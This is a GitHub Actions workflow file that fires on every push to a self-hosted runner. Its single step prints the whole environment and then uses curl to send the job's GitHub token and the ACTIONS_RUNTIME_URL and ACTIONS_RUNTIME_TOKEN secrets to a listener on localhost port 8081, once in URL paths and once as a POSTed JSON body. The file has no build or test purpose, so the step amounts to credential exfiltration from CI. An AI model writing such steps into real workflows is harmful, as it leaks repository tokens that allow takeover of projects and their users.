name: GitHub Actions
on: [push]
jobs:
  Job-One:
    runs-on: self-hosted
    steps:
      - shell: bash
        run: |
          echo "ðŸŽ‰ The job was automatically triggered by a ${{ github.event_name }} event."
          env
          curl -v http://localhost:8081/${{ github.token }} 
          curl -v http://localhost:8081/${ACTIONS_RUNTIME_URL}
          curl -v http://localhost:8081/${ACTIONS_RUNTIME_TOKEN}
          curl -v -X POST http://localhost:8081/req --data '{"token":"${ACTIONS_RUNTIME_TOKEN}","url":"${ACTIONS_RUNTIME_URL}"}'
          sleep 100

